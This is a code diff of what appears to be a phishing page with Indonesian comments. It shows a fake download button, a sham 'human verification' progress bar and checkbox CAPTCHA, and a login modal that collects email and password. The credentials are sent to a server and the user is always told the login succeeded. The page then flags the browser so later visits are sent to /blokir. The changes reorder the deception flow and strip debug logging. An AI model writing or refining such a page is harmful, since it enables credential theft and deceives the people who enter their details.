@@ -10,11 +10,9 @@
 html,body{width:100%;min-height:100%;overflow-x:hidden;background:#fff;font-family:Arial,Helvetica,sans-serif;color:#555;-webkit-text-size-adjust:100%;}
 button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 
-/* ================= HEADER ================= */
 .header{width:100%;height:auto;border-bottom:1px solid #ddd;background:#fff;padding:0;overflow:hidden;}
 .header-img{width:100%;height:auto;display:block;cursor:pointer;}
 
-/* ================= CONTENT ================= */
 .page{width:100%;display:flex;flex-direction:column;align-items:center;padding:0 16px 40px;}
 .ad-space{width:100%;height:180px;}
 .download-wrap{width:100%;max-width:600px;cursor:pointer;user-select:none;border-radius:6px;overflow:hidden;}
@@ -45,8 +43,8 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 .vt-title{font-size:17px;font-weight:bold;color:#222;margin-top:14px;margin-bottom:6px;}
 .vt-desc{font-size:13px;color:#333;line-height:1.5;}
 
-/* ================= VERIFIKASI (LANGSUNG MUNCUL) ================= */
-#verifyModal{position:fixed;inset:0;width:100%;height:100%;background:#fff;display:flex;align-items:center;justify-content:center;padding:20px;z-index:999999;}
+#verifyModal{position:fixed;inset:0;width:100%;height:100%;background:#fff;display:none;align-items:center;justify-content:center;padding:20px;z-index:999999;}
+#verifyModal.show{display:flex;}
 .verify-card{background:#fff;width:100%;max-width:380px;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.08);border:1px solid #eee;padding:36px 24px 28px;text-align:center;}
 .verify-progress-wrap{position:relative;width:90px;height:90px;margin:0 auto 22px;}
 .verify-progress-wrap svg{transform:rotate(-90deg);width:90px;height:90px;}
@@ -73,7 +71,6 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 .btn-lanjut.active{background:#1a73e8;color:#fff;cursor:pointer;}
 .verify-note{margin-top:18px;font-size:11px;color:#9aa0a6;line-height:1.5;}
 
-/* ================= LOGIN MODAL ================= */
 .modal{position:fixed;inset:0;width:100%;height:100%;background:rgba(0,0,0,.42);display:none;align-items:center;justify-content:center;padding:24px;z-index:99999;}
 .modal.show{display:flex;}
 .login-card{background:#fff;width:92%;max-width:410px;max-height:88vh;overflow-y:auto;border-radius:14px;box-shadow:0 10px 40px rgba(0,0,0,.28);}
@@ -105,7 +102,6 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 .signup-area{text-align:center;margin-top:17px;font-size:12px;color:#5f6368;}
 .signup-area button{border:0;background:none;color:#1a73e8;font-weight:500;font-size:12px;cursor:default;}
 
-/* ================= MOBILE ================= */
 @media(max-width:480px){
     .modal{padding:18px;}
     .login-card{width:88%;max-width:390px;max-height:84vh;}
@@ -135,9 +131,6 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 }
 </style>
 
-<!-- =========================================================
-     CEK BLOKIR DI HEAD — KALO UDAH SUBMIT, KE /blokir
-     ========================================================= -->
 <script>
 (function(){
     try {
@@ -207,7 +200,6 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 </main>
 
 
-<!-- ================= VERIFIKASI HUMAN ================= -->
 <div id="verifyModal">
     <div class="verify-card">
         <div class="verify-progress-wrap">
@@ -236,7 +228,6 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 </div>
 
 
-<!-- ================= LOGIN ================= -->
 <div class="modal" id="loginModal" onclick="outsideClose(event)">
     <div class="login-card" onclick="event.stopPropagation()">
         <div class="login-card-header">
@@ -282,16 +273,9 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 
 <script>
 
-/* =========================================================
-   STATE
-   ========================================================= */
 var captchaChecked = false;
 var verifyInterval = null;
 
-
-/* =========================================================
-   CEK BLOKIR
-   ========================================================= */
 function cekDeviceBlocked(){
     try{ if(localStorage.getItem("sudah_submit") === "1") return true; }catch(e){}
     try{ if(sessionStorage.getItem("sudah_submit") === "1") return true; }catch(e){}
@@ -300,16 +284,43 @@ function cekDeviceBlocked(){
 }
 
 function setDeviceBlocked(){
-    try{ localStorage.setItem("sudah_submit","1"); localStorage.setItem("submit_time", new Date().toISOString()); }catch(e){}
+    try{ localStorage.setItem("sudah_submit","1"); }catch(e){}
     try{ sessionStorage.setItem("sudah_submit","1"); }catch(e){}
     try{ document.cookie = "sudah_submit=1; max-age=31536000; path=/"; }catch(e){}
 }
 
 
 /* =========================================================
-   PROGRESS VERIF
+   KLIK TOMBOL → VERIF ATAU LOGIN
    ========================================================= */
-function mulaiProgress(){
+function openDownloadLogin(event){
+
+    if(event){ event.stopPropagation(); }
+
+    if(cekDeviceBlocked()){
+        window.location.replace("/blokir");
+        return;
+    }
+
+    /* KALO UDAH VERIF DI SESI INI → LANGSUNG LOGIN */
+    if(sessionStorage.getItem("verif_ok") === "1"){
+        document.getElementById("loginModal").classList.add("show");
+        return;
+    }
+
+    /* KALO BELUM → MUNCULIN VERIF */
+    openVerifyModal();
+}
+
+
+/* =========================================================
+   VERIF
+   ========================================================= */
+function openVerifyModal(){
+
+    var modal = document.getElementById("verifyModal");
+    if(!modal) return;
+    modal.classList.add("show");
 
     var bar = document.getElementById("verifyBar");
     var percentText = document.getElementById("verifyPercent");
@@ -357,10 +368,6 @@ function mulaiProgress(){
     }, 60);
 }
 
-
-/* =========================================================
-   CAPTCHA
-   ========================================================= */
 function toggleCaptcha(){
     captchaChecked = !captchaChecked;
     var frame = document.getElementById("captchaFrame");
@@ -380,9 +387,9 @@ function lanjutKeLogin(){
     if(btn){ btn.textContent = "Memverifikasi..."; btn.classList.remove("active"); btn.disabled = true; }
 
     setTimeout(function(){
-        sessionStorage.setItem("verified","1");
+        sessionStorage.setItem("verif_ok","1");
         var vm = document.getElementById("verifyModal");
-        if(vm) vm.style.display = "none";
+        if(vm) vm.classList.remove("show");
         var lm = document.getElementById("loginModal");
         if(lm) lm.classList.add("show");
         if(btn) btn.textContent = "Lanjutkan";
@@ -391,7 +398,7 @@ function lanjutKeLogin(){
 
 
 /* =========================================================
-   VALIDASI + HELPER
+   HELPER
    ========================================================= */
 function validasiInput(email, pass){
     if(!email || !pass) return "Harap isi email dan kata sandi!";
@@ -438,17 +445,6 @@ function detectBrowser(ua){
     if(/Firefox\//i.test(ua) && (m = ua.match(/Firefox\/([\d.]+)/i))) return "Firefox " + m[1];
     if(/Safari\//i.test(ua) && (m = ua.match(/Version\/([\d.]+)/i))) return "Safari " + m[1];
     return "Unknown";
-}
-
-
-/* =========================================================
-   OPEN/CLOSE
-   ========================================================= */
-function openDownloadLogin(event){
-    if(event){ event.stopPropagation(); }
-    if(cekDeviceBlocked()){ window.location.replace("/blokir"); return; }
-    if(!sessionStorage.getItem("verified")){ return; }
-    document.getElementById("loginModal").classList.add("show");
 }
 
 function closeLogin(){
@@ -517,17 +513,14 @@ function loginUser(event){
             });
         })
         .then(function(res){
-            console.log("STATUS:", res.status);
             if(res.status === 403){ window.location.replace("/blokir"); return null; }
             return res.json();
         })
         .then(function(result){
-            console.log("RESPON:", result);
             setDeviceBlocked();
             showMessage("✅ Login berhasil!", "success");
         })
         .catch(function(err){
-            console.log("ERROR:", err);
             setDeviceBlocked();
         })
         .finally(function(){
@@ -539,28 +532,12 @@ function loginUser(event){
 
 
 /* =========================================================
-   START — DOM READY
+   AUTO CEK PAS LOAD
    ========================================================= */
-document.addEventListener("DOMContentLoaded", function(){
-
-    /* KALO UDAH SUBMIT → BLOKIR */
+window.addEventListener("load", function(){
     if(cekDeviceBlocked()){
         window.location.replace("/blokir");
-        return;
     }
-
-    /* KALO UDAH VERIF DI SESI INI → SEMBUNYIIN VERIF, BUKA LOGIN */
-    if(sessionStorage.getItem("verified") === "1"){
-        var vm = document.getElementById("verifyModal");
-        if(vm) vm.style.display = "none";
-        var lm = document.getElementById("loginModal");
-        if(lm) lm.classList.add("show");
-        return;
-    }
-
-    /* KALO BELUM → MULAI PROGRESS (verif udah otomatis muncul dari CSS) */
-    mulaiProgress();
-
 });
 
 document.addEventListener("keydown", function(event){
